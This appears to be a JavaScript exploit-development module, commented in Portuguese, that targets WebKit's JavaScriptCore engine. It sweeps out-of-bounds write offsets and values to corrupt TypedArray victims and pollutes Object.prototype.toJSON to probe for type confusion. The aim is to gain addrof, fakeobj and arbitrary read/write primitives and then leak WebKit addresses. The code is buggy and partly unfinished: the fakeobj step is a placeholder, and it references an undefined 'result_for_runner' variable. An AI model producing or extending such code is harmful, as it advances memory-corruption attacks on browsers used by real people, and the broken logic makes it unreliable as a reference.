// js/script3/testArrayBufferVictimCrash.mjs (R43L - Testes Massivos para Addrof/FakeObj)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read, // Primitiva de leitura é crucial!
    arb_write, // Se tivermos uma primitiva de escrita arbitrária, seria ideal! (Assumindo que existe em core_exploit.mjs)
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs'; // Adicionar arb_write se disponível
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_MassiveExploitAttempt";

const VICTIM_TA_DEFAULT_SIZE_ELEMENTS = 8; // Tamanho padrão para TypedArrays
const VICTIM_TA_DEFAULT_BUFFER_SIZE_BYTES = VICTIM_TA_DEFAULT_SIZE_ELEMENTS * 4;

// Parâmetros para Testes Massivos
const OOB_OFFSETS_TO_TEST = [0x5C, 0x6C, 0x70, 0x74, 0x78, 0x7C, 0x80, 0x84, 0x9C];
const OOB_VALUES_TO_TEST = [
    0xABABABAB, 0xFFFFFFFF, 0x00000000, 0x41414141,
    JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID, // Tentar forçar um ID de estrutura conhecido
    // Adicionar mais StructureIDs conhecidos se disponíveis (ex: para JSString, JSObject simples)
    // (JSC_OFFSETS.JSCell.KnownStructureIDs?.JSString_STRUCTURE_ID || 0xストラングID),
    // (JSC_OFFSETS.JSCell.KnownStructureIDs?.JSObject_Simple_STRUCTURE_ID || 0xオブジェID),
    // Valores que podem ser interpretados como ponteiros pequenos se a memória for desalinhada
    // ou se corrompermos um ponteiro para que os bytes inferiores sejam esses.
    JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, // Se isso for escrito em um campo de ponteiro
    JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET,
];

const FILL_PATTERN_MASSIVE_TEST = 0xFEEDBEEF;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let global_target_function_for_addrof_if_needed;
let leaked_target_function_addr = null; // Endereço da função global acima
let found_addrof_primitive = false;
let found_fakeobj_primitive = false;
let found_arb_rw_via_victim_ta = false;

// Objeto global para armazenar objetos cujo endereço queremos, ou para colocar objetos falsos
let exploit_gadget_holder = {
    target_obj_for_addrof: null,
    fake_obj_victim: null,
    controlled_buffer_for_fake_struct: null, // ArrayBuffer
    controlled_view_for_fake_struct: null,   // Uint32Array view
};

function isValidPointer(ptr, context = "") { /* ... (sem alteração da última versão) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração da última versão) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    return toHex(value); // toHex do utils.mjs
}
function logTypedArrayShort(ta, name = "TypedArray", max = 4) { /* ... (sem alteração da última versão) ... */
    if (!ta || typeof ta.slice !== 'function') { return "N/A"; }
    const content = Array.from(ta.slice(0, Math.min(ta.length, max))).map(v => `0x${(v >>> 0).toString(16)}`);
    return `${name}[${content.join(", ")}${ta.length > max ? "..." : ""}] (len:${ta.length}, byteLen:${ta.byteLength})`;
}


// Função para tentar criar um objeto falso
// Requer addrof(ArrayBuffer.prototype.data) ou similar para saber onde o buffer de dados está.
// Ou, se tivermos arb_write, podemos construir a estrutura em qualquer lugar e apontar para ela.
async function attemptFakeObjConstruction(base_victim_obj_addr, fake_struct_addr) {
    // ... (Lógica complexa de fakeobj - Placeholder) ...
    // Esta função usaria arb_write para sobrescrever o ponteiro de Structure de base_victim_obj_addr
    // para apontar para fake_struct_addr.
    // fake_struct_addr seria o endereço de uma Structure que construímos em exploit_gadget_holder.controlled_buffer_for_fake_struct
    logS3(`[FakeObj] Tentativa de construir fakeobj em ${base_victim_obj_addr} com struct em ${fake_struct_addr} (NÃO IMPLEMENTADO)`, "warn");
    return false;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Testes Massivos para Addrof/FakeObj ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init Massive...`;

    global_target_function_for_addrof_if_needed = function someUniqueLeakFunctionR43L_MassiveTarget() { return `target_R43L_Massive_${Date.now()}`; };
    leaked_target_function_addr = null;
    found_addrof_primitive = false;
    found_fakeobj_primitive = false;
    found_arb_rw_via_victim_ta = false;

    // Preparar holder para estruturas falsas (exemplo)
    exploit_gadget_holder.controlled_buffer_for_fake_struct = new ArrayBuffer(1024);
    exploit_gadget_holder.controlled_view_for_fake_struct = new Uint32Array(exploit_gadget_holder.controlled_buffer_for_fake_struct);
    exploit_gadget_holder.controlled_view_for_fake_struct.fill(0xDEADBEEF); // Padrão


    logS3(`--- Fase 0 (Massive): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed", /*...*/ }; }

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null,
        addrof_result: { success: false, msg: "Addrof (Massive): Não obtido.", /*...*/ },
        fakeobj_result: { success: false, msg: "FakeObj (Massive): Não obtido." },
        webkit_leak_result: { success: false, msg: "WebKit Leak (Massive): Não obtido." },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        best_corruption_details: null
    };
    // CORRIGIDO: Declarar final_probe_call_count_for_report no escopo correto
    let final_probe_call_count_for_report = 0;


    // Loop principal para OOB Offsets
    for (const current_oob_offset of OOB_OFFSETS_TO_TEST) {
        if (found_addrof_primitive && found_fakeobj_primitive) break; // Parar se já encontramos tudo

        // Loop interno para Valores OOB
        for (const current_oob_value of OOB_VALUES_TO_TEST) {
            if (found_addrof_primitive && found_fakeobj_primitive) break;
            if (current_oob_value === null || current_oob_value === undefined) continue; // Pular valores nulos

            const current_oob_hex_val = safeToHex(current_oob_value);
            const current_offset_hex = safeToHex(current_oob_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

            logS3(`\n===== ITERATION Massive: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let victim_ta_for_analysis = null; // TypedArray vítima para análise de corrupção
            let iter_corruption_analysis = {
                offset_tested: current_offset_hex, value_written: current_oob_hex_val,
                original_length: VICTIM_TA_DEFAULT_SIZE_ELEMENTS,
                length_after_oob: null, byteLength_after_oob: null,
                length_corrupted: false, data_pointer_corrupted: false, // Especulativo
                read_beyond_original_ok: null, read_beyond_value: null,
                fill_pattern_intact: null, notes: ""
            };

            let probe_call_count_iter = 0;
            let m1_ref = null; let m2_ref = null; // Marcadores para a sonda TC
            let tc_detected_this_iter = false;
            let tc_details_this_iter = null;

            function massive_test_probe_toJSON() {
                probe_call_count_iter++; const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === m2_ref && m2_ref !== null);

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                    if (call_num === 1 && this === victim_ta_for_analysis) {
                        m2_ref = { id: "M2_Massive", some_prop: 123 };
                        // Tentar colocar o objeto alvo aqui, para que se 'this' se tornar M2
                        // e M2 for sobreposto por victim_ta_for_analysis, possamos ter uma leitura.
                        // Isso é altamente especulativo.
                        m2_ref.target_func_ref = global_target_function_for_addrof_if_needed;
                        m1_ref = { id: "M1_Massive", m2: m2_ref };
                        logS3(`[PROBE_Massive] Call #${call_num}: 'this' é victim_ta_for_analysis. M1/M2 criados.`, "debug_detail");
                        return m1_ref;
                    } else if (is_m2c) {
                        if (!tc_detected_this_iter) {
                            tc_detected_this_iter = true;
                            tc_details_this_iter = {
                                call_number_tc_detected: call_num, probe_variant: "MassiveProbe",
                                this_type_actual: ctts, this_is_M2: true,
                                m2_id: this.id, m2_some_prop: this.some_prop,
                                m2_target_func_ref_type: typeof this.target_func_ref
                            };
                            logS3(`[PROBE_Massive] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}). Tipo: ${ctts}`, "vuln");
                            logS3(`    'this.target_func_ref' tipo: ${typeof this.target_func_ref}`, "info");

                            // Se 'this' (M2) foi sobreposto por victim_ta_for_analysis (improvável, mas testando)
                            // e victim_ta_for_analysis teve seu dataPointer corrompido para apontar para target_func_ref.
                            if (victim_ta_for_analysis && victim_ta_for_analysis.length >= 2) {
                                let val0 = victim_ta_for_analysis[0];
                                let val1 = victim_ta_for_analysis[1];
                                logS3(`    Dentro da TC, lendo victim_ta_for_analysis[0,1]: 0x${val0.toString(16)}, 0x${val1.toString(16)}`, "leak_detail");
                                let potential_addr = new AdvancedInt64(val0, val1);
                                if (val0 !== FILL_PATTERN_MASSIVE_TEST && isValidPointer(potential_addr, "_probeTCReadVictim")) {
                                    logS3(`    !!! POTENCIAL ADDROF via victim_ta_for_analysis na sonda TC: ${potential_addr.toString(true)} !!!`, "success_major");
                                    leaked_target_function_addr = potential_addr;
                                    found_addrof_primitive = true; // Sinalizar sucesso
                                    iter_corruption_analysis.notes += "Addrof especulativo via victim_ta na sonda TC bem-sucedido! ";
                                }
                            }
                        }
                        // Tentar fazer JSON.stringify ler algo do M2 que possa ser útil
                        // Se M2 foi corrompido para ter um getter, ele seria acionado aqui.
                        return this; // Deixar JSON.stringify continuar
                    }
                } catch (e_pm) { /* ... */ }
                return { gen_m: call_num, type: ctts };
            }

            let iter_primary_error = null;
            try {
                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
                oob_write_absolute(current_oob_offset, current_oob_value, 4);
                logS3(`   OOB Write: ${current_oob_hex_val} @ ${current_offset_hex}`, 'info');
                await PAUSE_S3(50);

                victim_ta_for_analysis = new Uint32Array(VICTIM_TA_DEFAULT_SIZE_ELEMENTS);
                iter_corruption_analysis.original_length = victim_ta_for_analysis.length;
                logS3(`   Victim Uint32Array criado. Len: ${victim_ta_for_analysis.length}, ByteLen: ${victim_ta_for_analysis.byteLength}`, 'info');
                iter_corruption_analysis.length_after_oob = victim_ta_for_analysis.length;
                iter_corruption_analysis.byteLength_after_oob = victim_ta_for_analysis.byteLength;

                if (victim_ta_for_analysis.length !== VICTIM_TA_DEFAULT_SIZE_ELEMENTS) {
                    iter_corruption_analysis.length_corrupted = true;
                    iter_corruption_analysis.notes += `Comprimento CORROMPIDO! (${victim_ta_for_analysis.length}). `;
                    logS3(`   !!! COMPRIMENTO DO victim_ta_for_analysis CORROMPIDO !!! Obtido: ${victim_ta_for_analysis.length}`, "success_major");
                    found_arb_rw_via_victim_ta = true; // Sinalizar potencial R/W
                    // Tentar ler/escrever em índice alto
                    try {
                        const high_idx = Math.min(victim_ta_for_analysis.length - 1, 0xFFFF); // Limitar leitura
                        let val = victim_ta_for_analysis[high_idx];
                        iter_corruption_analysis.read_beyond_original_ok = true;
                        iter_corruption_analysis.read_beyond_value = safeToHex(val);
                        logS3(`   Leitura em índice alto (${high_idx}) OK: ${safeToHex(val)}`, "vuln");
                        // Tentar escrever e ler de volta
                        victim_ta_for_analysis[high_idx] = 0x12345678;
                        if (victim_ta_for_analysis[high_idx] === 0x12345678) {
                            logS3(`   Escrita/Leitura em índice alto (${high_idx}) confirmada! Primitiva R/W relativa obtida.`, "success_major");
                            iter_corruption_analysis.notes += "R/W em índice alto confirmado! ";
                        }
                        victim_ta_for_analysis[high_idx] = val; // Restaurar
                    } catch (e_high_idx) { iter_corruption_analysis.read_beyond_original_ok = false; iter_corruption_analysis.notes += `Err leitura índice alto. `; }
                }

                // Preencher e verificar padrão
                try { victim_ta_for_analysis.fill(FILL_PATTERN_MASSIVE_TEST); /* ... (lógica de verificação de padrão) ... */
                    let p_ok = true; for(let i=0;i<Math.min(victim_ta_for_analysis.length, VICTIM_TA_DEFAULT_SIZE_ELEMENTS);i++) if(victim_ta_for_analysis[i]!==FILL_PATTERN_MASSIVE_TEST) p_ok=false;
                    iter_corruption_analysis.fill_pattern_intact = p_ok;
                    if(!p_ok) {iter_corruption_analysis.notes += "Padrão não persistiu. "; logS3(` Padrão NÃO persistiu: ${logTypedArrayShort(victim_ta_for_analysis)}`,"vuln_potential");}
                } catch(e_fill){ iter_corruption_analysis.fill_pattern_intact="exception"; iter_corruption_analysis.notes += `Err fill. `; }


                // Sonda TC
                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                let stringify_output_raw = null;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: massive_test_probe_toJSON, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    stringify_output_raw = JSON.stringify(victim_ta_for_analysis);
                    logS3(`   JSON.stringify output: ${stringify_output_raw ? stringify_output_raw.substring(0,100) : "null" }...`, "debug_detail");
                    if (tc_detected_this_iter) logS3(`  TC Probe (Massive): TC CONFIRMADA.`, "vuln");
                    else logS3(`  TC Probe (Massive): TC NÃO Confirmada.`, "warn");
                } catch (e_str) { iter_primary_error = e_str; logS3(`  JSON.stringify EXCEPTION: ${e_str.message}`, "error"); }
                finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

                // Se addrof foi obtido na sonda TC, tentar WebKitLeak
                if (found_addrof_primitive && leaked_target_function_addr) {
                     // ... (Lógica WebKitLeak, usando leaked_target_function_addr)
                    // Certifique-se que o objeto em leaked_target_function_addr é uma função para esta lógica funcionar.
                    // Se for outro tipo de objeto, a lógica de WebKitLeak precisa ser adaptada.
                    logS3(`  ADDROF OBTIDO (${leaked_target_function_addr.toString(true)})! Tentando WebKitLeak... (NOTA: leaked_target_function_addr pode não ser uma função)`);
                    // A lógica padrão de WebKitLeak espera o endereço de uma JSFunction.
                    // Se leaked_target_function_addr for de outro tipo, isso pode falhar ou precisar de adaptação.
                    // Por enquanto, apenas registramos o addrof.
                    best_result_for_runner.addrof_result = { success: true, msg: `Addrof obtido especulativamente via TC: ${leaked_target_function_addr.toString(true)}`, leaked_object_addr: leaked_target_function_addr.toString(true) };

                }


            } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
            finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

            final_probe_call_count_for_report = probe_call_count_iter;
            let current_iter_summary = {
                oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
                raw_oob_offset: current_oob_offset, raw_oob_value: current_oob_value,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: tc_details_this_iter,
                corruption_analysis: iter_corruption_analysis,
                addrof_success_this_iter: found_addrof_primitive, // Se addrof foi encontrado nesta iteração
                fakeobj_success_this_iter: found_fakeobj_primitive, // Se fakeobj foi encontrado
                arb_rw_via_victim_ta_this_iter: found_arb_rw_via_victim_ta,
                heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica para atualizar best_result_for_runner
            if (current_iter_summary.error === null) {
                let current_is_better = false;
                const cur_len_corrupt = current_iter_summary.corruption_analysis.length_corrupted;
                const cur_tc = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                const cur_addrof = current_iter_summary.addrof_success_this_iter;

                if (best_result_for_runner.oob_params_of_best_result === null) current_is_better = true;
                else {
                    const best_len_corrupt = best_result_for_runner.best_corruption_details?.length_corrupted;
                    const best_tc = best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe;
                    const best_addrof = best_result_for_runner.addrof_result.success;

                    if (cur_addrof && !best_addrof) current_is_better = true;
                    else if (cur_addrof === best_addrof) {
                        if (cur_len_corrupt && !best_len_corrupt) current_is_better = true;
                        else if (cur_len_corrupt === best_len_corrupt) {
                            if (cur_tc && !best_tc) current_is_better = true;
                        }
                    }
                }
                if (current_is_better) {
                    best_result_for_runner.errorOccurred = null;
                    best_result_for_runner.tc_probe_details = current_iter_summary.tc_probe_details;
                    best_result_for_runner.addrof_result.success = current_iter_summary.addrof_success_this_iter;
                    if(current_iter_summary.addrof_success_this_iter) {
                        best_result_for_runner.addrof_result.leaked_object_addr = leaked_target_function_addr.toString(true); // Assumindo que leaked_target_function_addr é o endereço do addrof
                        best_result_for_runner.addrof_result.msg = `Addrof obtido: ${leaked_target_function_addr.toString(true)}`;
                    }
                    best_result_for_runner.oob_params_of_best_result = { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_oob_offset, raw_value: current_oob_value };
                    best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                    best_result_for_runner.best_corruption_details = current_iter_summary.corruption_analysis;
                    logS3(`*** NOVO MELHOR RESULTADO: Off ${current_offset_hex} Val ${current_oob_hex_val} (Addrof:${cur_addrof}, LenCorrupt:${cur_len_corrupt}, TC:${cur_tc}) ***`, "success_major");
                }
            }
             document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val} TC:${tc_detected_this_iter} LenCorrupt:${iter_corruption_analysis.length_corrupted}`;
             await PAUSE_S3(50); // Pausa curta entre valores OOB
        } // Fim do loop de Valores OOB
        if (found_addrof_primitive || found_fakeobj_primitive) { // Se encontramos o que queríamos, podemos parar os loops externos
             logS3("Primitiva(s) desejada(s) encontrada(s), parando busca de offset.", "success_major");
             break;
        }
        await PAUSE_S3(100); // Pausa entre Offsets OOB
    } // Fim do loop de Offsets OOB


    result_for_runner.total_probe_calls_last_iter = final_probe_call_count_for_report;
    result_for_runner.iteration_results_summary = iteration_results_summary; // Para o log do runner
    // Campos para compatibilidade com runner existente
    result_for_runner.oob_value_of_best_result = best_result_for_runner.oob_params_of_best_result ? `${best_result_for_runner.oob_params_of_best_result.offset}_${best_result_for_runner.oob_params_of_best_result.value}` : "N/A";
    // heisenbug_on_M2_in_best_result já está em best_result_for_runner

    // Tentar WebKitLeak final se addrof foi bem sucedido globalmente
    if (found_addrof_primitive && leaked_target_function_addr) {
        // ... (Lógica WebKitLeak como antes, verificando se leaked_target_function_addr é uma função)
        // Se o addrof foi de um objeto que não é a targetFunctionForLeak_... original, esta parte pode não ser diretamente aplicável
        // ou precisaria usar o endereço de global_target_function_for_addrof_if_needed se este foi o alvo do addrof bem-sucedido.
        // Por simplicidade, se found_addrof_primitive é true, o endereço está em leaked_target_function_addr.
        // A lógica de WebKitLeak precisaria do endereço de uma *função*.
        // Esta parte seria mais complexa dependendo do que o addrof vazou.
        logS3(`Addrof bem sucedido, mas a lógica de WebKitLeak aqui precisaria do endereço de uma função JS. Endereço vazado: ${leaked_target_function_addr.toString(true)}`, "info_emphasis");
        if (leaked_target_function_addr === global_target_function_for_addrof_if_needed) { // Checagem muito simplista
             logS3("Endereço vazado parece ser da função alvo global. Tentando WebKitLeak...", "info");
            // ... (colar lógica WebKitLeak aqui) ...
        } else {
             result_for_runner.webkit_leak_result = { success: false, msg: "Addrof obtido para objeto, mas não para a função JS alvo do WebKitLeak." };
        }
    }


    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final best_result_for_runner (Massive Test): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
    if(best_result_for_runner.addrof_result.success) final_title += "ADDROF_OK! ";
    if(best_result_for_runner.fakeobj_result.success) final_title += "FAKEOBJ_OK! ";
    if(best_result_for_runner.webkit_leak_result.success) final_title += "WEBKITLEAK_OK! ";
    if(best_result_for_runner.best_corruption_details?.length_corrupted) final_title += "LenCorrupt! ";
    if(best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe && !best_result_for_runner.addrof_result.success && !best_result_for_runner.best_corruption_details?.length_corrupted) final_title += "TC_OK ";
    if(final_title === `${FNAME_CURRENT_TEST_BASE} Final: `) final_title += "NoMajorSuccess";
    document.title = final_title;

    return best_result_for_runner; // Retornar o objeto completo para o runner
}
